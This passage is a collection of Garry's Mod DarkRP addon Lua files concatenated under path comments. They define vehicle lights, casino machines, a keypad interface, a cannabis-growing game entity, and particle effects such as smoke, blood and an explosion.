			{ pos = Vector(68.69,-23.38,21.31), ang = Angle(0,0,0), colorB = 200, colorA = 150, shadows = true },
		},
	},
	{
		Trigger = "main",
		SubMaterialID = 14,
		Sprites = {
			{ width = 45, height = 45, pos = Vector(-80.62,-20.41,17.87), colorG = 0, colorB = 0, colorA = 50 },
			{ width = 45, height = 45, pos = Vector(-80.62,20.41,17.87), colorG = 0, colorB = 0, colorA = 50 },
		}
	},
	{
		Trigger = "main",
		SubMaterialID = 19,
	},
	{
		Trigger = "high",
		SubMaterialID = 24,
		Sprites = {
			{ pos = Vector(68.59,23.41,18.51), colorB = 200, colorA = 150 },
			{ pos = Vector(68.59,-23.41,18.51), colorB = 200, colorA = 150 },
		},
		ProjectedTextures = {
			{ pos = Vector(68.59,23.41,18.51), ang = Angle(0,0,0), colorB = 200, colorA = 150, shadows = true },
			{ pos = Vector(68.59,-23.41,18.51), ang = Angle(0,0,0), colorB = 200, colorA = 150, shadows = true },
		},
	},

	{
		Trigger = "brake",
		SubMaterialID = 6,
		SubMaterialBrightness = 2,
		Sprites = {
			{ width = 45, height = 45, pos = Vector(-82.5,-10.94,18.28), colorG = 0, colorB = 0, colorA = 50 },
			{ width = 45, height = 45, pos = Vector(-82.5,10.94,18.28), colorG = 0, colorB = 0, colorA = 50 },
		}
	},

	{
		Trigger = "reverse",
		SubMaterialID = 18,
		Sprites = {
			{ pos = Vector(-82.1,-15.44,18.41), height = 25, width = 25, colorA = 150 },
			{ pos = Vector(-82.1,15.44,18.41), height = 25, width = 25, colorA = 150 },
		}
	},
		{
		Trigger = "turnright",
		SubMaterialID = 17,
		Sprites = {
			{ width = 35, height = 35, pos = Vector(-77.53,-25.71,18.07), colorG = 100, colorB = 0, colorA = 150 },
		},
	},
		{
		Trigger = "turnright",
		SubMaterialID = 29,
		Sprites = {
			{ width = 35, height = 35, pos = Vector(73.67,-26.36,10.64), colorG = 100, colorB = 0, colorA = 150 },
		},
	},
		{
		Trigger = "turnleft",
		SubMaterialID = 15,
		Sprites = {
			{ width = 35, height = 35, pos = Vector(-77.53,25.71,18.07), colorG = 100, colorB = 0, colorA = 150 },
		},
	},
		{
		Trigger = "turnleft",
		SubMaterialID = 28,
		Sprites = {
			{ width = 35, height = 35, pos = Vector(73.67,26.36,10.64), colorG = 100, colorB = 0, colorA = 150 },
		},
	},
	{
		Trigger = "fog",
		SubMaterialID = 30,
		SubMaterialBrightness = 10,
		Sprites = {
			{ pos = Vector(78.65,20.93,10.8), colorB = 200, colorA = 150, bodygroup = { name = "Front_Bumper", active = { 0 } }, },
			{ pos = Vector(78.65,-20.93,10.8), colorB = 200,colorA = 150, bodygroup = { name = "Front_Bumper", active = { 0 } }, },
			{ pos = Vector(76.74,21.78,10.73), colorB = 200, colorA = 150, bodygroup = { name = "Front_Bumper", active = { 2 } }, },
			{ pos = Vector(76.74,-21.78,10.73), colorB = 200,colorA = 150, bodygroup = { name = "Front_Bumper", active = { 2 } }, },
		},
	},
}

--PATH gamemodes/darkrp/entities/entities/npc_mayor/shared.lua:
ENT.Base = 'base_ai'
ENT.Type = 'ai'
ENT.PrintName = 'Mayor Select'
ENT.AutomaticFrameAdvance = true
ENT.Spawnable = true
ENT.Category = 'RP NPCs'
--PATH addons/_mayor_voting_systems/lua/entities/npc_mayorvoting/cl_init.lua:
include("shared.lua");

function ENT:Initialize ( )	
	self.AutomaticFrameAdvance = true;
end

function ENT:Draw()
	self:DrawModel()

	local pos = self:GetPos()
	pos.z = (pos.z + 15)
	local ang = self:GetAngles()
	
	surface.SetFont("Bebas40Font")
	local title = VOTING.Settings.NPCTitleText
	local tw = surface.GetTextSize(title)

	ang:RotateAroundAxis(ang:Forward(), 90)
	local textang = ang

	textang:RotateAroundAxis(textang:Right(), CurTime() * -180)

	cam.Start3D2D(pos + ang:Right() * -30, textang, 0.2)
		draw.WordBox(2, -tw *0.5 + 5, -180, title, "Bebas40Font", VOTING.Theme.ControlColor, color_white)
	cam.End3D2D()
end

--PATH addons/_pcasino/lua/entities/pcasino_mystery_wheel/shared.lua:
ENT.Type = "anim"
ENT.Base = "base_gmodentity"
ENT.PrintName = "Mysterly Wheel"
ENT.Author = "Owain Owjo & The One Free-Man"
ENT.Category = "pCasino"
ENT.RenderGroup = RENDERGROUP_BOTH
ENT.Spawnable = false
ENT.AdminSpawnable = false
ENT.noDrag = true

PerfectCasino.Core.RegisterEntity("pcasino_mystery_wheel", {
	general = {
		useFreeSpins = {d = true, t = "bool"} -- Can you use free spins on this machine
	},
	buySpin = {
		buy = {d = false, t = "bool"}, -- Can you buy a spin on this machine
		cost = {d = 1000000, t = "int"}, 
	},
	-- Combo data
	wheel = { -- I know, 20 slots :O
		{n = "$1", f = "money", i = 1, p = "dolla"},
		{n = "Nothing", f = "nothing", i = "nil", p = "melon"},
		{n = "$250,000", f = "money", i = 250000, p = "dolla"},
		{n = "Spin Again", f = "prize_wheel", i = "nil", p = "mystery_1"},
		{n = "Crossbow", f = "weapon", i = "weapon_crossbow", p = "chest"},
		{n = "$1,000,000", f = "money", i = 1000000, p = "dolla"},
		{n = "Nothing", f = "nothing", i = "nil", p = "melon"},
		{n = "Nothing", f = "nothing", i = "nil", p = "melon"},
		{n = "Die", f = "kill", i = "nil", p = "bell"},
		{n = "$50,000", f = "money", i = 50000, p = "dolla"},
		{n = "Nothing", f = "nothing", i = "nil", p = "melon"},
		{n = "100% Armor", f = "armor", i = 100, p = "diamond"},
		{n = "SMG", f = "weapon", i = "weapon_smg1", p = "chest"},
		{n = "Nothing", f = "nothing", i = "nil", p = "melon"},
		{n = "100% Health", f = "health", i = 100, p = "diamond"},
		{n = "$100,000", f = "money", i = 100000, p = "dolla"},
		{n = "Be Alyx", f = "setmodel", i = "models/player/alyx.mdl", p = "cherry"},
		{n = "Nothing", f = "nothing", i = "nil", p = "melon"},
		{n = "Nothing", f = "nothing", i = "nil", p = "melon"},
		{n = "7 HP", f = "health", i = 7, p = "seven"},
	}
},
"models/freeman/owain_mystery_wheel.mdl")
--PATH addons/_pcasino/lua/entities/pcasino_sign_interior_wall/cl_init.lua:
include("shared.lua")

function ENT:PostData()
end

function ENT:Draw()
	self:DrawModel()
	if self:GetPos():DistToSqr(LocalPlayer():GetPos()) > 1000000 then return end

	-- We can piggyback off the distance check to only request the entities data when it's needed :D
	if (not self.data) and (not PerfectCasino.Cooldown.Check(self:EntIndex(), 5)) then
		PerfectCasino.Core.RequestConfigData(self)
		return
	end

	if not self.data then return end

	local pos = self:GetPos()
	local ang = self:GetAngles()
	ang:RotateAroundAxis(ang:Forward(), 90)
	ang:RotateAroundAxis(ang:Right(), -90)

	cam.Start3D2D(pos + (self:GetUp() * 2.8) + (self:GetForward() * 0.1) + (self:GetRight() * 10.8), ang, 0.06)
		PerfectCasino.UI.WrapText(self.data.general.text, 25, "pCasino.Title.Static", 180, 47, color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
	cam.End3D2D()
end
--PATH addons/_pcasino/lua/entities/pcasino_sign_plaque/cl_init.lua:
include("shared.lua")

function ENT:Initialize()
	self.letters = {}

	self.hasInitialized = true
end

function ENT:PostData()
	if not self.hasInitialized then
		self:Initialize()
	end
	
	local letterMap = PerfectCasino.Core.Letter

	-- Letter calculations
	local startPoint = self:GetRight() * 25
	local curLength = vector_origin
	local right = self:GetRight()

	for k, v in ipairs(string.Split(string.lower(self.data.general.text), "")) do
		if not letterMap[v] then -- It's either a space or a character we don't support
			curLength = curLength + (self:GetRight() * 5)
			continue
		end

		-- Create the letter
		local letter = ClientsideModel("models/freeman/owain_casino_alphabet.mdl")
		if not IsValid(letter) then return end
		table.insert(self.letters, letter)
		letter:SetParent(self)
		curLength = curLength + ((self:GetRight()) * (letterMap[v].w*2))
		letter:SetPos(self:GetPos() + startPoint - curLength + ((self:GetRight()) * (letterMap[v].w)))
		letter:SetAngles(self:GetAngles())
		letter:SetBodygroup(1, letterMap[v].b)
	end
end

function ENT:OnRemove()
	-- Clear the board of last rounds best
	for k, v in pairs(self.letters) do
		if not IsValid(v) then continue end

		v:Remove()
	end
end

function ENT:Draw()
	self:DrawModel()
	if self:GetPos():DistToSqr(LocalPlayer():GetPos()) > 1000000 then return end

	-- We can piggyback off the distance check to only request the entities data when it's needed :D
	if (not self.data) and (not PerfectCasino.Cooldown.Check(self:EntIndex(), 5)) then
		PerfectCasino.Core.RequestConfigData(self)
		return
	end
end
--PATH addons/_pcasino/lua/entities/pcasino_slot_machine/shared.lua:
ENT.Type = "anim"
ENT.Base = "base_gmodentity"
ENT.PrintName = "Slot Machine"
ENT.Author = "Owain Owjo & The One Free-Man"
ENT.Category = "pCasino"
ENT.Spawnable = false
ENT.AdminSpawnable = false
ENT.noDrag = true

function ENT:SetupDataTables()
	self:NetworkVar("Int", 0, "CurrentJackpot")
end

PerfectCasino.Core.RegisterEntity("pcasino_slot_machine", {
	-- General data
	general = {
		limitUse = {d = false, t = "bool"}
	},
	-- Bet data
	bet = {
		default = {d = 1000, t = "num"}, -- The default bet
	},
	-- Combo data
	combo = {
		{c = {"bell", "bell", "bell"}, p = 0.5, j = false},
		{c = {"melon", "melon", "melon"}, p = 0.8, j = false},
		{c = {"cherry", "cherry", "cherry"}, p = 1, j = false},
		{c = {"seven", "seven", "seven"}, p = 1.6, j = false},
		{c = {"clover", "clover", "clover"}, p = 2, j = false},
		{c = {"diamond", "diamond", "diamond"}, p = 2.5, j = false},
		{c = {"diamond", "diamond", "anything"}, p = 2, j = false},
		{c = {"anything", "diamond", "diamond"}, p = 2, j = false},
		{c = {"berry", "berry", "berry"}, p = 2.8, j = false},
		{c = {"dollar", "dollar", "dollar"}, p = 0, j = true},
	},
	jackpot = {
		toggle = {d = true, t = "bool"}, -- The bell chance
		startValue = {d = 10000, t = "num"}, -- Jackpot start value
		betAdd = {d = 0.5, t = "num"}, -- The % of the bet to add to the jackpot
	},
	-- Chance data
	chance = {
		bell = {d = 15}, -- The bell chance
		melon = {d = 10}, -- The watermelon chance
		cherry = {d = 8}, -- The cherry chance
		seven = {d = 6}, -- The seven chance
		clover = {d = 5}, -- The clover chance
		diamond = {d = 3}, -- The diamond chance
		berry = {d = 2}, -- The strawberrry chance
		dollar = {d = 1} -- The dollar chance
	},
},
"models/freeman/owain_slotmachine.mdl")
--PATH addons/__main/lua/entities/pp_prop_effect.lua:
AddCSLuaFile()

ENT.Type = "anim"

ENT.PrintName		= ""
ENT.Author			= ""
ENT.Contact			= ""
ENT.Purpose			= ""
ENT.Instructions	= ""
ENT.Spawnable		= false
ENT.AdminOnly		= false

--[[---------------------------------------------------------
	Name: Initialize
-----------------------------------------------------------]]
function ENT:Initialize()

	local Radius = 6
	local min = Vector( 1, 1, 1 ) * Radius * -0.5
	local max = Vector( 1, 1, 1 ) * Radius * 0.5

	if ( SERVER ) then

		self.AttachedEntity = ents.Create( "prop_dynamic" )
		self.AttachedEntity:SetModel( self:GetModel() )
		self.AttachedEntity:SetAngles( self:GetAngles() )
		self.AttachedEntity:SetPos( self:GetPos() )
		self.AttachedEntity:SetSkin( self:GetSkin() )
		self.AttachedEntity:Spawn()
		self.AttachedEntity:SetParent( self.Entity )
		self.AttachedEntity:DrawShadow( false )

		self:SetModel( "models/props_junk/watermelon01.mdl" )

		self:DeleteOnRemove( self.AttachedEntity )

		-- Don't use the model's physics - create a box instead
		self:PhysicsInitBox( min, max )

		-- Set up our physics object here
		local phys = self:GetPhysicsObject()
		if ( IsValid( phys ) ) then
			phys:Wake()
			phys:EnableGravity( false )
			phys:EnableDrag( false )
		end

		self:DrawShadow( false )
		self:SetCollisionGroup( COLLISION_GROUP_WEAPON )

	else

		self.GripMaterial = Material( "sprites/grip" )

		-- Get the attached entity so that clientside functions like properties can interact with it
		local tab = ents.FindByClassAndParent( "prop_dynamic", self )
		if ( tab && IsValid( tab[ 1 ] ) ) then self.AttachedEntity = tab[ 1 ] end

	end

	-- Set collision bounds exactly
	self:SetCollisionBounds( min, max )

end


--[[---------------------------------------------------------
	Name: Draw
-----------------------------------------------------------]]
function ENT:Draw()

	render.SetMaterial( self.GripMaterial )

end


--[[---------------------------------------------------------
	Name: PhysicsUpdate
-----------------------------------------------------------]]
function ENT:PhysicsUpdate( physobj )

	if ( CLIENT ) then return end

	-- Don't do anything if the player isn't holding us
	if ( !self:IsPlayerHolding() && !self:IsConstrained() ) then

		physobj:SetVelocity( Vector( 0, 0, 0 ) )
		physobj:Sleep()

	end

end


--[[---------------------------------------------------------
	Name: Called after entity 'copy'
-----------------------------------------------------------]]
function ENT:OnEntityCopyTableFinish( tab )

	-- We need to store the model of the attached entity
	-- Not the one we have here.
	tab.Model = self.AttachedEntity:GetModel()

	-- Store the attached entity's table so we can restore it after being pasted
	tab.AttachedEntityInfo = table.Copy( duplicator.CopyEntTable( self.AttachedEntity ) )
	tab.AttachedEntityInfo.Pos = nil -- Don't even save angles and position, we are a parented entity
	tab.AttachedEntityInfo.Angle = nil

	-- Do NOT store the attached entity itself in our table!
	-- Otherwise, if we copy-paste the prop with the duplicator, its AttachedEntity value will point towards the original prop's attached entity instead, and that'll break stuff
	tab.AttachedEntity = nil

end


--[[---------------------------------------------------------
	Name: PostEntityPaste
-----------------------------------------------------------]]
function ENT:PostEntityPaste( ply )

	-- Restore the attached entity using the information we've saved
	if ( IsValid( self.AttachedEntity ) ) and ( self.AttachedEntityInfo ) then

		-- Apply skin, bodygroups, bone manipulator, etc.
		duplicator.DoGeneric( self.AttachedEntity, self.AttachedEntityInfo )

		if ( self.AttachedEntityInfo.EntityMods ) then
			self.AttachedEntity.EntityMods = table.Copy( self.AttachedEntityInfo.EntityMods )
			duplicator.ApplyEntityModifiers( ply, self.AttachedEntity )
		end

		if ( self.AttachedEntityInfo.BoneMods ) then
			self.AttachedEntity.BoneMods = table.Copy( self.AttachedEntityInfo.BoneMods )
			duplicator.ApplyBoneModifiers( ply, self.AttachedEntity )
		end

		self.AttachedEntityInfo = nil

	end

end

--PATH addons/__main/lua/entities/savav_watermelon/shared.lua:
ENT.Base = "base_anim"
ENT.Type = "anim"

ENT.PrintName		= "Crazy watermelon"
ENT.Author			= "SaVav"
ENT.Category 		= "SaVav's trash"
ENT.Contact    		= ""
ENT.Purpose 		= "take it"

ENT.Spawnable			= true
ENT.AdminSpawnable		= true


--PATH addons/__________skeypads/lua/entities/skeypad/cl_init.lua:
include( 'shared.lua' )
local imgui = include( 'skeypads/lib/cl_imgui.lua' )
local screenPos = Vector( -0.38, 3.589, 9.09 )
local screenAngles = Angle( 0, 270, 90 )
local scrW, scrH = 359, 116
local padPos = Vector( -0.4, 3.589, 6.48 )
local padW, padH = 479, 669
local keySize = 100
local keySpacing = 30
local keyOffsetX = 58
local keyOffsetY = 90
local fprintPos = Vector( -0.42, .8, -4.45 )
local fprintSize = 100
local fprintMat = onyx.wimg.Simple( 'https://i.imgur.com/nqbOdLv.png', 'noclamp smooth' )
ENT.KeyCol = color_white
local lerp = Lerp
local function lerpColor( t, from, to )
    local newCol = ColorAlpha( color_black, 255 )
    newCol.r = lerp( t, from.r, to.r )
    newCol.g = lerp( t, from.g, to.g )
    newCol.b = lerp( t, from.b, to.b )
    newCol.a = lerp( t, from.a, to.a )
    return newCol
end

local function drawOutlinedBox( x, y, w, h, thickness )
    for i = 0, thickness - 1 do
        surface.DrawOutlinedRect( x + i, y + i, w - i * 2, h - i * 2 )
    end
end

local col1 = Color( 137, 0, 179 )
local col2 = Color( 235, 106, 106 )
local col3 = Color( 108, 235, 106 )
local col4 = Color( 180, 180, 180 )
local font1 = onyx.FontNoScale( 'Comfortaa Bold', 100 )
local font2 = onyx.FontNoScale( 'Comfortaa', 90 )
local font3 = onyx.FontNoScale( 'Comfortaa Bold', 37 )
function ENT:DrawTranslucent()
    self:DrawModel()
    local fingerprintCol = color_white
    if imgui.Entity3D2D( self, padPos, screenAngles, 0.015, 300, 200 ) then
        surface.SetDrawColor( 0, 0, 0, 220 )
        surface.DrawRect( 0, 0, padW, padH, padW, padH )
        local inputBlocked = self:GetInputBlocked()
        if self:GetIsOpen() then
            self.KeyCol = lerpColor( FrameTime() * 5, self.KeyCol, col3 )
        elseif inputBlocked then
            self.KeyCol = lerpColor( FrameTime() * 5, self.KeyCol, col2 )
        else
            self.KeyCol = lerpColor( FrameTime() * 5, self.KeyCol, col1 )
        end

        local keys = self.KeyRegions
        local i = 0
        for k, v in SortedPairsByMemberValue( keys, 'order' ) do
            if not v.num then continue end
            local keyX = i % 3 * ( keySize + keySpacing ) + keyOffsetX
            local keyY = math.Round( ( i - 1 ) / 3 ) * ( keySize + keySpacing ) + keyOffsetY
            draw.SimpleText( v.displayText, #v.displayText > 1 and font3 or font2, keyX + keySize * 0.5, keyY + keySize * 0.5, self.KeyCol, 1, 1 )
            if not inputBlocked and imgui.IsHovering( keyX, keyY, keySize, keySize ) then
                surface.SetDrawColor( color_white )
                drawOutlinedBox( keyX, keyY, keySize, keySize, 2 )
                if imgui.IsPressed() then
                    net.Start( 'sKeypads::PressKey' )
                    net.WriteEntity( self )
                    net.WriteString( k )
                    net.SendToServer()
                end
            end

            i = i + 1
        end

        local fprintKey = keys['fingerprint']
        if imgui.IsHovering( fprintKey.pos[1], fprintKey.pos[2], fprintKey.size[1], fprintKey.size[2] ) then
            fingerprintCol = col4
            if imgui.IsPressed() then
                net.Start( 'sKeypads::PressKey' )
                net.WriteEntity( self )
                net.WriteString( 'fingerprint' )
                net.SendToServer()
            end
        end

        imgui.End3D2D()
    else
        return
    end

    cam.Start3D2D( self:LocalToWorld( screenPos ), self:LocalToWorldAngles( screenAngles ), 0.02 )
    surface.SetDrawColor( 0, 0, 0 )
    surface.DrawRect( 0, 0, scrW, scrH )
    draw.SimpleText( self:GetScreenText(), font1, scrW * 0.5, scrH * 0.5, color_white, 1, 1 )
    cam.End3D2D()
    cam.Start3D2D( self:LocalToWorld( fprintPos ), self:LocalToWorldAngles( screenAngles ), 0.015 )
    fprintMat( 0, 0, fprintSize, fprintSize, fingerprintCol )
    cam.End3D2D()
end
--PATH addons/____sprinter/lua/entities/sprinter_base_phys/cl_init.lua:
include("shared.lua")

function ENT:Initialize()
	self:SetCollisionGroup(COLLISION_GROUP_IN_VEHICLE)
	self:DrawShadow(false)
end

function ENT:Draw()
end
--PATH addons/uweedadvancedcannabisgrowth/lua/entities/uweed_light/shared.lua:
ENT.Type = "anim"
ENT.Base = "base_gmodentity"
ENT.PrintName = "[UWeed] Light"
ENT.RenderGroup = RENDERGROUP_BOTH
ENT.Author = "Owain Owjo"
ENT.Category = "UWeed"
ENT.Spawnable = true
ENT.AdminSpawnable = true

function ENT:SetupDataTables()
	self:NetworkVar("Entity", 0, "owning_ent")
	self:NetworkVar("Bool", 0, "On")
	self:NetworkVar("Int", 0, "Battery")
	
	self:NetworkVar("Bool", 1, "FirstSpawn")
end
--PATH addons/uweedadvancedcannabisgrowth/lua/entities/uweed_seed/cl_init.lua:
include("shared.lua")

local grn = Color(0, 0, 0, 255)
local xpos = 25
local ypos = 0

function ENT:Draw()
	self:DrawModel()
end

function ENT:DrawTranslucent()
	if self:GetPos():Distance(LocalPlayer():GetPos()) > 500 then return end
	local ang = LocalPlayer():EyeAngles()
	local pos = self:GetPos() + Vector(0,0,10)

	ang:RotateAroundAxis(ang:Forward(), 90)
	ang:RotateAroundAxis(ang:Right(), 90)

	cam.Start3D2D(pos, ang, 0.06)
		-- Background
		draw.RoundedBox(0, xpos, ypos+0, 220, 120, Color(0, 0, 0, 225))
		-- Side bar
		draw.RoundedBox(0, xpos, ypos+0, 10, 120, grn)
	
		draw.SimpleText(string.upper(UWeed.Translation.Seed.Title), "uweed_font_80", xpos+10, ypos+35, Color(255, 255, 255), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
		draw.SimpleText(UWeed.Translation.Seed.Text, "uweed_font_60", xpos+10, ypos+90, Color(255, 255, 255), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
	cam.End3D2D()
end
--PATH addons/_farmer/lua/effects/ba_cage_hit.lua:
--[[
	Just a first attempt in effect.
	Green text just makes me feel better.
]]--

function EFFECT:Init(data)
	
	local offset = data:GetOrigin();
	
	--sound.Play("garrysmod/balloon_pop_cute.wav", offset, 90, math.random(90, 120));
	
	local particlesAmount = math.random(32, 64);
	local emitter = ParticleEmitter(offset, false);
		for i=0, particlesAmount do
			local particle = emitter:Add("particle/smokesprites_000"..math.random(1, 9), offset);
			
			if (particle) then
				
				particle:SetVelocity(Vector(math.random(-150, 150), math.random(-150, 150), math.random(-16, 128)));
				
				particle:SetLifeTime(0);
				particle:SetDieTime(2.65);
				
				particle:SetStartAlpha(255);
				particle:SetEndAlpha(0);
				
				particle:SetStartSize(math.random(18, 24));
				particle:SetEndSize(math.random(2, 4));
				
				particle:SetRoll(math.random(180, 480));
				particle:SetRollDelta(math.random(-2, 2));
				
				particle:SetAirResistance(256);
				particle:SetGravity(Vector(0, 0, 64));
				
				particle:SetColor(195, 195, 195);
				
				particle:SetCollide(true);
				particle:SetBounce(1);
				
				particle:SetAngleVelocity(Angle(math.random(-2, 2), math.random(-2, 2), math.random(-2, 2)));
				
				particle:SetLighting(true);
			end;
		end;
	emitter:Finish();
end;


function EFFECT:Think()
	return false;
end;


function EFFECT:Render()

end;

--PATH addons/_avatar/lua/effects/bloodstream.lua:
--///////////////////////////////////////////////////////
--///////////////////////////////////////////////////////
--/////////////////////Bloodstream effect////////////////
--//////////Made by Archemyde////////////////////////////
--//For Realistic Chainsaw///////////////////////////////
--///////////////////////////////////////////////////////
util.PrecacheSound( "physics/flesh/flesh_bloody_impact_hard1.wav" )
util.PrecacheSound( "physics/flesh/flesh_squishy_impact_hard1.wav" )
util.PrecacheSound( "physics/flesh/flesh_squishy_impact_hard2.wav" )
util.PrecacheSound( "physics/flesh/flesh_squishy_impact_hard3.wav" )
util.PrecacheSound( "physics/flesh/flesh_squishy_impact_hard4.wav" )
local function CollideCallback( particle, hitpos, hitnormal )
	if not particle.HitAlready then
		particle.HitAlready = true
		local pos = hitpos + hitnormal
		util.Decal( "Blood", pos, hitpos - hitnormal )
		particle:SetDieTime( 0 )
	end
end

function EFFECT:Init( data )
	local Pos = data:GetOrigin() + Vector( 0, 0, 10 )
	local emitter = ParticleEmitter( Pos )
	for _ = 1, data:GetMagnitude() do
		local particle = emitter:Add( "decals/blood" .. math.random( 1, 8 ), Pos + VectorRand() * 8 )
		particle:SetDieTime( math.Rand( 3, 6 ) )
		particle:SetStartAlpha( 230 )
		particle:SetEndAlpha( 230 )
		particle:SetStartSize( math.Rand( 10, 14 ) )
		particle:SetEndSize( 10 )
		particle:SetRoll( math.Rand( 0, 360 ) )
		particle:SetRollDelta( math.Rand( -20, 20 ) )
		particle:SetAirResistance( 5 )
		particle:SetBounce( 0 )
		particle:SetGravity( Vector( 0, 0, -600 ) )
		particle:SetCollide( true )
		particle:SetCollideCallback( CollideCallback )
		particle:SetLighting( true )
		particle:SetColor( 255, 0, 0 )
	end

	emitter:Finish()
end

function EFFECT:Think()
	return false
end

function EFFECT:Render()
end
--PATH addons/_drones/lua/effects/dronesrewrite_explosionsmall.lua:
AddCSLuaFile()

function EFFECT:Init(data)
	self.Start = data:GetOrigin()

	self.Emitter = ParticleEmitter(self.Start)
	
	for i = 1, 30 do
		local vec = VectorRand()
		local p = self.Emitter:Add("effects/fleck_cement" .. math.random(1, 2), self.Start)

		p:SetDieTime(math.random(1, 6))
		p:SetStartAlpha(math.random(50, 150))
		p:SetEndAlpha(0)
		p:SetStartSize(math.random(1, 2))
		p:SetRoll(math.Rand(-10, 10))
		p:SetRollDelta(math.Rand(-10, 10))
		p:SetEndSize(0)		
		p:SetVelocity(vec * 200)
		p:SetGravity(Vector(0, 0, -100))
		p:SetColor(0, 0, 0)
	end

	for i = 1, 10 do
		local vec = VectorRand()
		local p = self.Emitter:Add("particle/smokesprites_000" .. math.random(1, 3), self.Start + vec * 10)

		p:SetDieTime(math.random(1, 2))
		p:SetStartAlpha(math.random(50, 150))
		p:SetEndAlpha(0)
		p:SetStartSize(10)
		--p:SetRoll(math.Rand(-10, 10))
		--p:SetRollDelta(math.Rand(-10, 10))
		p:SetEndSize(70)		
		p:SetVelocity(vec * 10)
		p:SetGravity(Vector(0, 0, 40))
		p:SetCollide(true)
		p:SetColor(50, 50, 20)
	end

	for i = 1, 20 do
		local vec = VectorRand()
		local p = self.Emitter:Add("particles/fir21", self.Start + vec * 2)

		p:SetDieTime(0.2)
		p:SetStartAlpha(20)
		p:SetEndAlpha(0)
		p:SetStartSize(5)
		p:SetRoll(math.Rand(-10, 10))
		p:SetRollDelta(math.Rand(-4, 4))
		p:SetEndSize(10)		
		p:SetVelocity(vec * 50)
		p:SetAirResistance(40)
	end	
	
	self.Emitter:Finish()
end

function EFFECT:Think()
	return false
end
--PATH addons/_drones/lua/effects/dronesrewrite_nuke.lua:
 AddCSLuaFile()

local glow = CreateMaterial("glow", "UnlitGeneric", {["$basetexture"] = "sprites/orangecore1", ["$spriterendermode"] = 9, ["$ignorez"] = 1, ["$illumfactor"] = 8, ["$additive"] = 1, ["$vertexcolor"] = 1, ["$vertexalpha"] = 1})

function EFFECT:Init(data)
	self.Start = data:GetOrigin()
	self.LifeTime = CurTime() + 32
	self.Index = math.random(1, 1337)
	
	self.Value = 1
	self.Alpha = 255
	self.Size = 0

	local tr = util.TraceLine({
		start = self.Start,
		endpos = self.Start - vector_up * 5000,
		mask = MASK_SOLID_BRUSHONLY
	})

	self.Mushroom = tr.Hit

	hook.Add("RenderScreenspaceEffects", "dronesrewrite_nuke_blind" .. self.Index, function()
		local val = self.Value
		if not val then return end

		local tab = {
			["$pp_colour_addr"] = 1 * val,
			["$pp_colour_addg"] = 0.5 * val,
			["$pp_colour_addb"] = 0,
			["$pp_colour_brightness"] = -0.1 * val,
			["$pp_colour_contrast"] = 1 + 0.8 * val,
			["$pp_colour_colour"] = 1 - 0.7 * val,
			["$pp_colour_mulr"] = 0,
			["$pp_colour_mulg"] = 0,
			["$pp_colour_mulb"] = 0
		}
		
		DrawColorModify(tab)
	end)

	util.ScreenShake(self:GetPos(), 4, 2, 15, 100000) 

	sound.Play("ambient/explosions/explode_1.wav", LocalPlayer():GetPos(), 100, 50)

	for i = 1, 3 do
		sound.Play("drones/missilelaunch.wav", self.Start, 150, 30)
		sound.Play("drones/missilelaunch.wav", self.Start, 150, 60)
		sound.Play("ambient/explosions/explode_6.wav", self.Start, 150)
		sound.Play("ambient/explosions/explode_6.wav", self.Start, 180)
	end

	self.Emitter = ParticleEmitter(self.Start)

	local p = self.Emitter:Add("sprites/heatwave", self.Start)
	p:SetDieTime(10)
	p:SetStartAlpha(255)
	p:SetEndAlpha(0)
	p:SetStartSize(math.Rand(4000, 8000))
	p:SetEndSize(20000)
	p:SetRoll(math.Rand(-5, 5))
	p:SetRollDelta(math.Rand(-5, 5))

	for i = 1, 90 do
		local i = i * 2

		for a = 1, 2 do
			local p = self.Emitter:Add("particle/smokesprites_000" .. math.random(3, 9), self.Start)
			p:SetDieTime(math.random(10, 20))
			p:SetStartAlpha(64)
			p:SetEndAlpha(0)
			p:SetStartSize(2000)
			p:SetEndSize(1000)
			p:SetRollDelta(math.random(-0.4, 0.4))
			p:SetVelocity(Vector(math.sin(i * 0.5), math.cos(i * 0.5), 0) * 8000)
			p:SetColor(80, 50, 50)
		end

		for a = 1, 4 do
			local vec = VectorRand()
			vec.z = 0

			local p = self.Emitter:Add("particle/smokesprites_000" .. math.random(3, 9), self.Start + vec * 20000)
			p:SetDieTime(math.random(10, 25))
			p:SetStartAlpha(64)
			p:SetEndAlpha(0)
			p:SetStartSize(0)
			p:SetEndSize(math.random(1000, 2000))
			p:SetRollDelta(math.random(-0.4, 0.4))
			p:SetVelocity(Vector(math.sin(i * 0.5), math.cos(i * 0.5), 0) * 400)
			p:SetColor(50, 50, 50)
		end

		local size = math.random(1300, 2300)

		if self.Mushroom then
			local p = self.Emitter:Add("particle/smokesprites_000" .. math.random(3, 9), self.Start)
			p:SetDieTime(math.random(35, 45) + i * 0.02)
			p:SetStartAlpha(150)
			p:SetEndAlpha(0)
			p:SetStartSize(800)
			p:SetEndSize(size * 0.9)
			p:SetRollDelta(math.random(-0.4, 0.4))	
			p:SetAirResistance(12)
			p:SetVelocity(vector_up * i * 8 + VectorRand() * 100)
			p:SetColor(50, 50, 50)

			local p = self.Emitter:Add("particles/fir21", self.Start)
			p:SetDieTime(math.random(6, 8) + i * 0.02)
			p:SetStartAlpha(155)
			p:SetEndAlpha(0)
			p:SetStartSize(size * 0.6)
			p:SetEndSize(size * 0.2)
			p:SetRollDelta(math.random(-0.4, 0.4))	
			p:SetAirResistance(12)
			p:SetVelocity(vector_up * i * 8 + VectorRand() * 60)

			local size = math.random(1024, 2048)

			for i = 1, 3 do
				local p = self.Emitter:Add("particle/smokesprites_000" .. math.random(3, 9), self.Start)
				p:SetDieTime(math.random(45, 55))
				p:SetStartAlpha(150)
				p:SetEndAlpha(0)
				p:SetStartSize(1000)
				p:SetEndSize(size * 1.3)
				p:SetRollDelta(math.random(-0.4, 0.4))
				p:SetAirResistance(12)
				local vec = VectorRand()
				vec.z = vec.z * 0.8
				p:SetVelocity(vector_up * 1900 + vec * size * 0.45)
				p:SetColor(50, 50, 50)
			end

			local p = self.Emitter:Add("particles/fir21", self.Start)
			p:SetDieTime(math.random(4, 8))
			p:SetStartAlpha(150)
			p:SetEndAlpha(0)
			p:SetStartSize(size)
			p:SetEndSize(size)
			p:SetRollDelta(math.random(-2, 2))
			p:SetAirResistance(12)
			p:SetVelocity(vector_up * 1900 + VectorRand() * size * 0.4)
		end

		local size = math.random(2500, 3500)

		local p = self.Emitter:Add("particles/fir21", self.Start)
